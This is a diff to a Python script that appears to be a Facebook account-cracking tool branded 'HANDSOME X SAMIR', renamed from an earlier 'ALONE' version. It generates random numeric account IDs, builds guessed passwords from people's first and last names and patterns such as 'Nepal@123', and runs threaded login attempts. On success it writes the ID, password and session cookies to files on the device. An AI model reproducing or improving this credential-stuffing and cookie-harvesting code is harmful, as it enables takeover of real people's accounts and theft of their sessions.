@@ -234,8 +234,8 @@ logo=("""
                                                                                     
 
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
- ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME X SAMIR     ┃𝐒𝐓𝐀𝐓𝐔𝐒:FREE       ┃
- ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1          ┃
+ ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME X SAMIR     ┃𝐒𝐓𝐀𝐓𝐔𝐒:FREE        ┃
+ ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1.1        ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
  ┃𝐆𝐈𝐓𝐇𝐔𝐁:HANDSOMEXSAMIR    ┃ 𝐓𝐎𝐎𝐋 : FILE         |
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
@@ -333,17 +333,19 @@ def file():
                                         plist.append('first@12345')        
                                         plist.append('first123@')
                                         plist.append('@first123')
-                                        plist.append('first12')         
-                                        plist.append('@first')
+                                        plist.append('first123456789')         
+                                        plist.append('first456')
                                         plist.append('first111')       
-                                        plist.append('first00')     
+                                        plist.append('maya123')     
                                         plist.append('firstlast123')       
                                         plist.append('firstlast@123')   
                                         plist.append('last123')
                                         plist.append('last@123') 
                                         plist.append('last111')
-                                        plist.append('last00')
-                                        plist.append('first11')
+                                        plist.append('Nepal123')
+                                        plist.append('nepal@123')
+					plist.append('Nepal@123')
+					plist.append('nepal123')
                                 else:
                                         try:
                                                 linex()
@@ -433,7 +435,7 @@ def npxind():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(6))
                         user.append(nmp)
-                with tred(max_workers=30) as ALONE:     
+                with tred(max_workers=30) as HANDSOME:     
                         clear()
                         id = str(len(user))
                         print('Total account : \033[1;32m'+id)
@@ -455,7 +457,7 @@ def npxind():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python ALONE.py')    
+                os.system('python HANDSOME.py')    
                 
 def pak():
                 user=[]
@@ -477,7 +479,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as ALONE:     
+                with tred(max_workers=30) as HANDSOME:     
                         clear()
                         id = str(len(user))
                         print('Total account : \033[1;32m'+id)
@@ -496,7 +498,7 @@ def pak():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python ALONE.py')       
+                os.system('python HANDSOME.py')       
 def bd():
                 user=[]
                 clear()
@@ -595,7 +597,7 @@ def gmail():
 def M1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [ALONE-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [HANDSOME-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -665,7 +667,7 @@ def M1(ids,names,passlist):
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                         print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m')                                        
-                                        open('/sdcard/HANDSOME_M1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ALONE_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        open('/sdcard/HANDSOME_M1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOME_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
                                         break
